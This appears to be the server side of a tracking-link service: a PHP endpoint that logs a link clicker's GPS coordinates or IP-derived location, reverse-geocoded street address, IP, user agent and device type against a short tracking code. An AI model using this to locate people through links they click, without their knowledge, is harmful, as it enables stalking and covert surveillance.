<?php
require_once('../config.php');

// Set JSON response header
header('Content-Type: application/json');

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

try {
    $db = connectDB();
    
    // Get POST data
    $code = $_POST['code'] ?? '';
    $latitude = $_POST['latitude'] ?? '';
    $longitude = $_POST['longitude'] ?? '';
    $accuracy = $_POST['accuracy'] ?? '';
    $timestamp = $_POST['timestamp'] ?? date('Y-m-d H:i:s');
    $ip_only = $_POST['ip_only'] ?? false;
    
    // Validate required fields
    if (empty($code)) {
        throw new Exception('Missing tracking code');
    }
    
    // If IP-only mode, skip coordinate validation
    if (!$ip_only) {
        if (empty($latitude) || empty($longitude)) {
            throw new Exception('Missing required fields');
        }
        
        // Validate coordinates
        if (!is_numeric($latitude) || !is_numeric($longitude)) {
            throw new Exception('Invalid coordinates');
        }
        
        if ($latitude < -90 || $latitude > 90 || $longitude < -180 || $longitude > 180) {
            throw new Exception('Coordinates out of valid range');
        }
    }
    
    // Get link ID from short code
    $stmt = $db->prepare("SELECT id FROM geo_links WHERE short_code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if (!$link) {
        throw new Exception('Invalid tracking code');
    }
    
    $link_id = $link['id'];
    
    // Get user information
    $ip_address = $_SERVER['HTTP_CLIENT_IP'] 
        ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
        ?? $_SERVER['REMOTE_ADDR'] 
        ?? 'UNKNOWN';
    
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $referrer = $_SERVER['HTTP_REFERER'] ?? '';
    $device_type = preg_match('/mobile/i', $user_agent) ? 'Mobile' : 'Desktop';
    
    // Get location details using reverse geocoding or IP-based geolocation
    $geo_data = null;
    $country = 'Unknown';
    $city = 'Unknown';
    $address = 'Unknown';
    
    if ($ip_only) {
        // Use IP-based geolocation for fallback
        try {
            $ip = $_SERVER['HTTP_CLIENT_IP'] 
                ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
                ?? $_SERVER['REMOTE_ADDR'] 
                ?? 'UNKNOWN';
            
            $geo_url = "http://ip-api.com/json/{$ip}";
            $geo_response = @file_get_contents($geo_url);
            
            if ($geo_response) {
                $geo_data = json_decode($geo_response, true);
                if ($geo_data && $geo_data['status'] === 'success') {
                    $country = $geo_data['country'] ?? 'Unknown';
                    $city = $geo_data['city'] ?? 'Unknown';
                    $address = $geo_data['city'] . ', ' . $geo_data['country'];
                }
            }
        } catch (Exception $e) {
            // Continue without geocoding data
        }
    } else {
        // Use reverse geocoding for GPS coordinates
        try {
            $geo_url = "https://nominatim.openstreetmap.org/reverse?format=json&lat={$latitude}&lon={$longitude}&zoom=18&addressdetails=1";
            $geo_response = @file_get_contents($geo_url);
            
            if ($geo_response) {
                $geo_data = json_decode($geo_response, true);
            }
        } catch (Exception $e) {
            // Continue without geocoding data
        }
        
        // Extract location details
        $country = $geo_data['address']['country'] ?? 'Unknown';
        $city = $geo_data['address']['city'] ?? $geo_data['address']['town'] ?? 'Unknown';
        $address = $geo_data['display_name'] ?? 'Unknown';
    }
    
    // Insert precise location data
    if ($ip_only) {
        // Insert IP-only data (no coordinates)
        $stmt = $db->prepare("
            INSERT INTO geo_logs (
                link_id, ip_address, user_agent, referrer, 
                country, city, address,
                device_type, timestamp, location_type
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'IP')
        ");
        
        $stmt->execute([
            $link_id,
            $ip_address,
            $user_agent,
            $referrer,
            $country,
            $city,
            $address,
            $device_type,
            $timestamp
        ]);
    } else {
        // Insert GPS data
        $stmt = $db->prepare("
            INSERT INTO geo_logs (
                link_id, ip_address, user_agent, referrer, 
                latitude, longitude, accuracy, country, city, address,
                device_type, timestamp, location_type
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'GPS')
        ");
        
        $stmt->execute([
            $link_id,
            $ip_address,
            $user_agent,
            $referrer,
            $latitude,
            $longitude,
            $accuracy,
            $country,
            $city,
            $address,
            $device_type,
            $timestamp
        ]);
    }
    
    // Update click count
    $db->prepare("UPDATE geo_links SET click_count = click_count + 1 WHERE id = ?")->execute([$link_id]);
    
    // Return success response
    echo json_encode([
        'success' => true,
        'message' => 'Location saved successfully',
        'data' => [
            'latitude' => $latitude,
            'longitude' => $longitude,
            'accuracy' => $accuracy,
            'country' => $country,
            'city' => $city,
            'address' => $address
        ]
    ]);
    
} catch (Exception $e) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}
?>